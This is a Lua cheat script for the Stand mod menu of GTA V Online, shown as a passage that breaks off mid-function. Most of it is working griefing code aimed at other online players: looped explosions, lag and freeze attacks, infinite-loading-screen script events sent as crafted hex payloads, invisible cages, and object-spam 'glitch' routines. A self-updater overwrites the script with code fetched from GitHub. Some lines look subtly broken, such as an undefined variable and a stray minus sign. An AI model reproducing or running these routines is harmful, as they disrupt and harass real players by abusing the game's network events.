-- This was created by XxpichoclesxX#0427 with some help already mentioned in credits.
-- The original download site should be github.com/xxpichoclesxx, if you got this script from anyone selling it, you got sadly scammed.
-- Also this is only for some new stand people because is a trolling and online feature script, not recovery.
-- So enjoy and pls join my discord, to know when the script is updated or be able to participate in polls.


util.keep_running()
util.require_natives(1663599433)

util.toast("Welcome to the script!!")
util.toast("Loading, wait... (1-2s)")
local response = false
local localVer = 3.851
async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
    currentVer = tonumber(output)
    response = true
    if localVer ~= currentVer then
        util.toast("An update is available, click on update to update the script.")
        menu.action(menu.my_root(), "Update Lua", {}, "", function()
            async_http.init('raw.githubusercontent.com','/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/Translations/RyzeStand_ENG.lua',function(a)
                local err = select(2,load(a))
                if err then
                    util.toast("There was an error, download it manually from github.")
                return end
                local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
                f:write(a)
                f:close()
                util.toast("Updated script, restarting :3")
                util.restart_script()
            end)
            async_http.dispatch()
        end)
    end
end, function() response = true end)
async_http.dispatch()
repeat 
    util.yield()
until response

--local required <const> = {
--    "lib/natives-1663599433.lua",
--    "lib/ryzescript/sportmode.lua"
--}
--local scriptdir <const> = filesystem.scripts_dir()
--for _, file in ipairs(required) do
--	assert(filesystem.exists(scriptdir .. file), "Required file not found: " .. file)
--end

--spmode = require "ryzescript.sportmode"

if not SCRIPT_MANUAL_START then
    util.stop_script()
end

sleep(1200)

local modded_vehicles = {
    "dune2",
    "tractor",
    "dilettante2",
    "asea2",
    "cutter",
    "mesa2",
    "jet",
    "skylift",
    "policeold1",
    "policeold2",
    "armytrailer2",
    "towtruck",
    "towtruck2",
    "cargoplane",
}

local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
}

local spawned_objects = {}
local ladder_objects = {}

local remove_projectiles = false
function disableProjectileLoop(projectile)
    util.create_thread(function()
        util.create_tick_handler(function()
            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

function yieldModelLoad(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
end

function rotation_to_direction(rotation) 
    local adjusted_rotation = 
    { 
        x = (math.pi / 180) * rotation.x, 
        y = (math.pi / 180) * rotation.y, 
        z = (math.pi / 180) * rotation.z 
    }
    local direction = 
    {
        x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
        y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
        z =  math.sin(adjusted_rotation.x)
    }
    return direction
end

local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

local launch_vehicle = {"Throw Up", "Throw Go ahead", "Throw Back", "Throw Down", "Catapult"}
local invites = {"Yacht", "Office", "Clubhouse", "Office Garage", "Custom Auto Shop", "Apartment"}
local style_names = {"Normal", "Semi-Rushed", "Reverse", "Ignore Lights", "Avoid Traffic", "Avoid Traffic Extremely", "Sometimes Overtake Traffic"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

local function BlockSyncs(player_id, callback)
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "on")
        end
    end
    util.yield(10)
    callback()
    for _, i in ipairs(players.list(false, true, true)) do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            menu.trigger_command(outSync, "off")
        end
    end
end

local int_min = -2147483647
local int_max = 2147483647

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, -
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            -1, 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    memory.free(ptr1)
    memory.free(ptr2)
    memory.free(ptr3)
    memory.free(ptr4)
    return {p1, p2, p3, p4}
end

function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    return destination
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] ~= 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end

clear_radius = 100
function clear_area(radius)
    target_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    MISC.CLEAR_AREA(target_pos['x'], target_pos['y'], target_pos['z'], radius, true, false, false, false)
end

local function request_ptfx_asset(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end

local function kick_player_out_of_veh(player_id)
    local max_time = os.millis() + 1000
    local player_ped  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local kick_vehicle_command_ref = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Kick From Vehicle")
    menu.trigger_command(kick_vehicle_command_ref)

    while PED.IS_PED_IN_ANY_VEHICLE(player_ped) do
        if os.millis() >= max_time then
            break
        end

        util.yield()
    end
end

local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 243)) 
end

local function is_player_in_interior(pid)
    return (memory.read_int(memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 243)) ~= 0)
end

local function get_random_pos_on_radius(pos, radius)
    local angle = random_float(0, 2 * math.pi)
    pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)
    return pos
end


local function player_toggle_loop(root, player_id, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(player_id) then util.stop_thread() end
        callback()
    end)
end

local function get_blip_coords(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end

local online = menu.list(menu.my_root(), "Online", {}, "Online mode options")
local world = menu.list(menu.my_root(), "World", {}, "Options around you")
local detections = menu.list(menu.my_root(), "Detection", {}, "The name says it ;w;")
local protects = menu.list(menu.my_root(), "Protections", {}, "Protect yourself against modders")
local vehicles = menu.list(menu.my_root(), "Vehicle", {}, "Car Options")
local fun = menu.list(menu.my_root(), "Fun", {}, "Have fun for a while if you're bored :3")
local misc = menu.list(menu.my_root(), "Misc", {}, "Useful and fast shortcuts")

players.on_join(function(player_id)
    menu.divider(menu.player_root(player_id), "RyzeScript")
    local ryzescriptd = menu.list(menu.player_root(player_id), "RyzeScript")
    local malicious = menu.list(ryzescriptd, "Malicious")
    local trolling = menu.list(ryzescriptd, "Troll")
    local friendly = menu.list(ryzescriptd, "Friendly")
    local vehicle = menu.list(ryzescriptd, "Vehicle")
	local otherc = menu.list(ryzescriptd, "Other")




    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    local explosion = 18
    local explosion_names = {
        [0] = "Girl",
        [1] = "Mediana",
        [2] = "Big",
        [3] = "Vicente"
    }

    local explosions = menu.list(malicious, "Methods Explosion", {}, "")

    local explode_slider = menu.slider_text(explosions, "Explode", {"customexplode"}, "", explosion_names, function()
        local player_pos = players.get_position(player_id)
        FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
    end)

    util.create_tick_handler(function()
        if not players.exists(player_id) then
            return false
        end

        local index = menu.get_value(explode_slider)

        pluto_switch index do
            case 1:
                explosion = 0
                break
            case 2:
                explosion = 34
                break
            case 3:
                explosion = 82
                break
            pluto_default:
                explosion = 18
        end
    end)

    menu.toggle_loop(explosions, "Loop Explode", {"customexplodeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "Loop Atomize", {"atomizeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(explosions, "Loop Fireworks", {"fireworkloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            util.yield(100)
        end
    end)




    local flushes = menu.list(malicious, "Loops", {}, "")

    menu.toggle_loop(flushes, "Loop Flame", {"flameloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield()
        end
    end)

    menu.toggle_loop(flushes, "Loop Water", {"waterloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield()
        end
    end)




    menu.divider(malicious, "Other")

    local lagplay = menu.list(malicious, "Lag Player", {}, "")

    menu.toggle_loop(lagplay, "Method V1", {"rlag"}, "Freeze Player To Make Work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Method V2", {rlag2}, "Freeze Player To Make Work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Method V3", {rlag3}, "Freeze Player To Make Work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Method V4", {rlag4}, "Freeze Player To Make Work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)
	
	menu.toggle_loop(lagplay, "Method V5", {rlag5}, "Dont specate or go within particle", function()
		local player_pos = players.get_position(player_id)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_clown_death", player_pos.x, player_pos.y, player_pos.z, 0, 0, 10, 255, false, false, false
         )
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_exp_clown", player_pos.x, player_pos.y, player_pos.z, 0, 0, 10, 255, false, false, false
         )
		request_ptfx_asset("scr_ch_finale")
       GRAPHICS.USE_PARTICLE_FX_ASSET("scr_ch_finale")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
			"scr_ch_finale_drill_sparks", player_pos.x, player_pos.y, player_pos.z, 0, 0, 10, 255, false, false, false
		 )
end)
	
    local cageveh = menu.list(trolling, "Cage Car", {}, "")

    menu.action(cageveh, "Caging Vehicle", {"cage"}, "", function()
        local container_hash = util.joaat("boxville3")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)

    local cage = menu.list(trolling, "Cage Player", {}, "")
    menu.action(cage, "Electric Cage", {"electriccage"}, "", function(cl)
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    
    menu.action(cage, "Queen Isabell's cage", {""}, "", function(cl)
        local number_of_cages = 6
        local coffin_hash = util.joaat("prop_coffin_02b")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(coffin_hash)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.8)
            obj_pos:add(pos)
            obj_pos.z += 0.1
           local coffin = entities.create_object(coffin_hash, obj_pos)
           spawned_objects[#spawned_objects + 1] = coffin
           ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
           ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
        end
    end)

    menu.action(cage, "Cargo container", {"cage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    menu.action(cage, "Delete cages", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("Deleted " .. entitycount .. " cages")
    end)

    menu.action(trolling, "Freeze", {""}, "", function(cl)
        local number_of_cages = 10
        local ladder_hash = util.joaat("prop_towercrane_02el2")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(ladder_hash)
        
        if TASK.IS_PED_STILL(ped) then
            util.toast("The player is still.")
        return end

        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.25)
            obj_pos:add(pos)
            local ladder = entities.create_object(ladder_hash, obj_pos)
            ladder_objects[#ladder_objects + 1] = ladder
            ENTITY.SET_ENTITY_VISIBLE(ladder, false)
            ENTITY.SET_ENTITY_ROTATION(ladder, 0.0, 0.0, angle, 2, 0)
            ENTITY.FREEZE_ENTITY_POSITION(ladder, true)
        end
        util.yield(2500)
        for i, object in ipairs(ladder_objects) do
            entities.delete_by_handle(object)
        end
    end)




    menu.divider(trolling, "Others")

    local inf_loading = menu.list(trolling, "Infinite loading screen", {}, "")
    menu.action(inf_loading, "Teleport a MC", {}, "", function()
        util.trigger_script_event(1 << player_id, {0xDEE5ED91, player_id, 0, 32, NETWORK.NETWORK_HASH_FROM_PLAYER_HANDLE(pid), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(inf_loading, "Method Apartament", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x7EFC3716, player_id, 0, 1, id})
    end)
        
    menu.action_slider(inf_loading, "Telephone corrupt", {}, "Click to select a style", invites, function(index, name)
        pluto_switch name do
            case 1:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x1})
                util.toast("Invitation to yacht")
            break
            case 2:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x2})
                util.toast("Invitation to office")
            break
            case 3:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x3})
                util.toast("Club Invitation")
            break
            case 4:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x4})
                util.toast("Invitation to the office garage")
            break
            case 5:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x5})
                util.toast("Invitation to the los santos cs")
            break
            case 6:
                util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, 0x6})
                util.toast("Invitation to apartment")
            break
        end
    end)


    local freeze = menu.list(malicious, "Methods Freeze", {}, "")

    player_toggle_loop(freeze, player_id, "Powerful", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x4868BC31, player_id, 0, 0, 0, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(freeze, player_id, "Freeze V1 (Blocked by majority)", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x7EFC3716, player_id, 0, 1, 0, 0})
        util.yield(500)
    end)

    --player_toggle_loop(freeze, player_id, "Freeze V2 (Bloqueado por populares)", {}, "", function()
    --    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    TASK.CLEAR_PED_TASKS_IMMEDIATELY(player_id)
    --end)


    local options <const> = {"Lazer", "Mammatus",  "Cuban800"}
	menu.action_slider(malicious, ("Kamikaze"), {}, "", options, function (index, plane)
		local hash <const> = util.joaat(plane)
		request_model(hash)
		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
		local pos = players.get_position(targetPed, 20.0, 20.0)
		pos.z = pos.z + 30.0
		local plane = entities.create_vehicle(hash, pos, 0.0)
		players.get_position(plane, targetPed, true)
		VEHICLE.SET_VEHICLE_FORWARD_SPEED(plane, 150.0)
		VEHICLE.CONTROL_LANDING_GEAR(plane, 3)
	end)


    local msg = ("The mercenaries are already following him")

	menu.action(trolling, ("Send Mercenaries"), {}, "", function()
		if NETWORK.NETWORK_IS_SESSION_STARTED() and NETWORK.NETWORK_IS_PLAYER_ACTIVE(pid) and
		not PED.IS_PED_INJURED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)) and not is_player_in_interior(player_id) then

			if not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 1, true, 0) then
				local bits_addr = memory.script_global(1853348 + (players.user() * 834 + 1) + 140)
				memory.write_int(bits_addr, SetBit(memory.read_int(bits_addr), 1))
				write_global.int(1853348 + (players.user() * 834 + 1) + 141, pid)
			else
				notification:help(msg, HudColour.red)
			end
		end
	end) 

    menu.action(trolling, "Killing indoors", {}, "Does not work in apartments (Love u jinx x2)", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)

        for i, interior in ipairs(interior_stuff) do
            if get_interior_player_is_in(player_id) == interior then
                util.toast("Jugador no esta en interior. D:")
            return end
            if get_interior_player_is_in(player_id) ~= interior then
                util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
            end
        end
    end)

    glitchiar = menu.list(trolling, "Glitch options", {}, "")


    player_toggle_loop(glitchiar, player_id, "Bug Movement", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()    
    end)


    local glitch_player_list = menu.list(glitchiar, "Glitch Player", {"glitchdelay"}, "") 
    local object_stuff = {
        names = {
            "Ferris Wheel",
            "UFO",
            "Cement Mixer",
            "Scaffolding",
            "Garage Door",
            "Big Bowling Ball",
            "Big Soccer Ball",
            "Big Orange Ball",
            "Stunt Ramp",

        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_root",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
        }
    }

    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "Object", {"glitchplayer"}, "Object to use for Glitch Player.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "Spawn Delay", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "Glitch Player", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
				util.toast("Player is too far. :/")
				menu.set_value(glitchPlayer_toggle, false)
            break end

            if not players.exists(player_id) then 
                util.toast("Player doesn't exist. :/")
                menu.set_value(glitchPlayer_toggle, false)
            util.stop_thread() end

            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            request_model(glitch_hash)
            request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(glitchiar, "Glitch Vehicle", {"glitchvehicle"}, "", function(toggle) -- jinx <3
        glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(player_id)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("Player muh away. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not players.exists(player_id) then 
                util.toast("The player does not exist. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                util.toast("The player is not in a car. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("There are no seats available. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
